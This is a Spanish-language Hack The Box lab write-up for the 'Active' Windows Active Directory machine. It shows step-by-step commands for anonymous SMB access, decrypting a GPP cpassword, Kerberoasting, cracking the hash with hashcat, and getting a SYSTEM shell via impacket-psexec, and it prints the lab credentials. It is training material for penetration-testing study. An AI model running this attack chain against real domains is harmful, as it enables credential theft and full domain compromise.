[🔒 ACtive — HTB [Windows · Easy · AD] 36c15bd2d16c81f4ad5fcf699e6569b3.md](https://github.com/user-attachments/files/28306604/ACtive.HTB.Windows.Easy.AD.36c15bd2d16c81f4ad5fcf699e6569b3.md)

# 🔒 ACtive — HTB [Windows · Easy · AD]

| Campo | Detalle |
| --- | --- |
| IP | `10.129.28.61` |
| Dominio | `active.htb` |
| Vector inicial | SMB anónimo → Replication share → Groups.xml (GPP) → gpp-decrypt |
| Usuario inicial | `SVC_TGS` : `GPPstillStandingStrong2k18` |
| Escalada | Kerberoasting → hash Administrator → hashcat → `Ticketmaster1968` |
| Root | `nt authority\system` vía impacket-psexec |
| Metasploit | ❌ No usado |

---

# 1. Reconocimiento

## Nmap

Otro DC clásico. Lo que llama la atención aquí es que **no hay WinRM (5985)** pero sí hay SMB (445). El vector de entrada va a ser SMB.

```bash
nmap -sS -p- --min-rate 5000 10.129.28.61
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Active/assets/image.png)
> 

```bash
nmap -sV -sC -p 53,88,135,139,389,445,636,3268 10.129.28.61
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Active/assets/image1.png)
> 

---

# 2. Enumeración SMB — Acceso anónimo

```bash
smbclient -L //10.129.28.61 -N
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Active/assets/image2.png)
> 

```bash
smbclient //10.129.28.61/Replication -N
smb: \> recurse ON
smb: \> ls
```

Navegando el share encontramos una ruta clásica de GPP: `\active.htb\Policies\{GUID}\MACHINE\Preferences\Groups\Groups.xml`.

```bash
smb: \> get active.htb/Policies/.../Groups.xml
cat Groups.xml
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Active/assets/image3.png)
> 

---

# 3. GPP Decrypt

Este es un `Groups.xml` de Group Policy Preferences — una configuración de política de grupo de Windows que permitía (hasta MS14-025) almacenar credenciales cifradas en el SYSVOL. El cifrado AES-256 que usaba tenia la clave hardcodeada y pública en la documentación de Microsoft. `gpp-decrypt` la rompe directamente.

```bash
gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJ0dcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Active/assets/image4.png)
> 

Credencial obtenida: `SVC_TGS:GPPstillStandingStrong2k18`.

---

# 4. Validación y Kerberoasting

## Validar credenciales

```bash
nxc ldap 10.129.28.61 -u SVC_TGS -p GPPstillStandingStrong2k18
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Active/assets/image5.png)
> 

## Kerberoasting

Con credenciales válidas buscamos cuentas con SPN — candidatos a Kerberoasting.

```bash
impacket-GetUserSPNs -dc-ip 10.129.28.61 \
  active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Active/assets/image6.png)
> 

El propio Administrator tiene un SPN registrado — lo que significa que podemos pedir un ticket de servicio para su cuenta y crackearlo offline. En un entorno real esto sería crítico.

---

# 5. Crackeo del hash

```bash
hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --force -O
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Active/assets/image7.png)
> 

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Active/assets/image8.png)
> 

Contraseña del Administrator: `Ticketmaster1968`.

---

# 6. Acceso como Administrator

## Validar

```bash
nxc smb 10.129.28.61 -u Administrator -p 'Ticketmaster1968'
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Active/assets/image9.png)
> 

## Shell con psexec

```bash
impacket-psexec 'active.htb/Administrator:Ticketmaster1968@10.129.28.61'
```

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Active/assets/image10.png)
> 

## Flags

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Active/assets/image11.png)
> 

> 
> 
> 
> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Active/assets/image12.png)
> 

---

# 7. Cadena de ataque

```
SMB anónimo → share Replication → Groups.xml (GPP)
    ↓
gpp-decrypt cpassword → SVC_TGS:GPPstillStandingStrong2k18
    ↓
GetUserSPNs → Administrator tiene SPN → TGS hash
    ↓
hashcat -m 13100 rockyou.txt → Ticketmaster1968
    ↓
impacket-psexec → nt authority\system → flags
```

---

# 8. Moralejas

## GPP credentials es un hallazgo clásico que sigue apareciendo

MS14-025 parcheó la posibilidad de crear nuevas políticas GPP con contraseñas, pero no borró las existentes. Cualquier entorno configurado antes de 2014 puede tener `Groups.xml`, `Services.xml`, `Scheduledtasks.xml` o `Datasources.xml` con `cpassword` en el SYSVOL. El reflejo es siempre revisar el share `Replication` o `SYSVOL` con acceso anónimo y buscar esos archivos XML.

## Kerberoasting contra Administrator es el caso más crítico

Normalmente el Kerberoasting afecta a cuentas de servicio. Que el propio Administrator tenga un SPN registrado es inusual y especialmente peligroso: su hash tiene más probabilidades de crackearse porque los admins suelen poner contraseñas memorables. En un pentest real esto se reporta como crítico independientemente de si el hash se crackea o no.

## Sin WinRM, psexec es el camino

Cuando no hay 5985 disponible, `impacket-psexec` con credenciales de admin local da SYSTEM directamente. Funciona subiendo un servicio temporal al share ADMIN$. El `Pwn3d!` de netexec confirma que tenemos privilegios suficientes para ese movimiento.

## El patrón de Active para el OSCP

```
SMB anónimo → GPP credentials en SYSVOL/Replication
    ↓
Cuentas con SPN → Kerberoasting → crackeo offline
    ↓
psexec con credenciales de admin → SYSTEM
```

Este patrón doble (GPP + Kerberoasting) es uno de los más frecuentes en el OSCP AD set. Reconocerlo rápido ahorra mucho tiempo.

---

# 9. Comandos clave

```bash
# SMB anónimo
smbclient -L //10.129.28.61 -N
smbclient //10.129.28.61/Replication -N

# Navegar y descargar Groups.xml
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *

# GPP Decrypt
gpp-decrypt "<cpassword>"

# Validar credenciales
nxc ldap 10.129.28.61 -u SVC_TGS -p GPPstillStandingStrong2k18
nxc smb 10.129.28.61 -u SVC_TGS -p GPPstillStandingStrong2k18

# Kerberoasting
impacket-GetUserSPNs -dc-ip 10.129.28.61 \
  active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request

# Crackeo hash TGS
hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --force -O

# Validar admin
nxc smb 10.129.28.61 -u Administrator -p 'Ticketmaster1968'

# Shell SYSTEM
impacket-psexec 'active.htb/Administrator:Ticketmaster1968@10.129.28.61'

# Flags
type c:\Users\SVC_TGS\Desktop\user.txt
type c:\Users\Administrator\Desktop\root.txt
```
